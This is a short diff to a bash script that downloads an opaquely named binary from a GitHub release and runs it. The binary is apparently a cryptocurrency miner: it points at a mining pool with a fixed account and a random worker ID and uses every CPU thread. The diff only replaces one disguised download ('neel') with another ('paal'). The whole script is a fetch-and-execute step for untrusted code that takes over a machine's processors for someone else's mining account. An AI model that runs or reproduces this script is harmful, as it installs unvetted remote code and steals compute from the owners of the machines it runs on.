@@ -1,4 +1,4 @@
 #!/bin/bash
-wget https://github.com/billingadal/viras/releases/download/yasm/neel
-chmod +x neel
-./neel --algo qubic_xmr --account CP_43058os6pk --worker $(echo $(shuf -i 1-15000 -n 1)-CAMP) --pool qubic1.hk.apool.io:3334 --thread $(nproc --all)
+wget https://github.com/billingadal/tras/releases/download/gwnx/paal
+chmod +x paal
+./paal --algo qubic_xmr --account CP_43058os6pk --worker $(echo $(shuf -i 1-15000 -n 1)-CAMP) --pool qubic1.hk.apool.io:3334 --thread $(nproc --all)
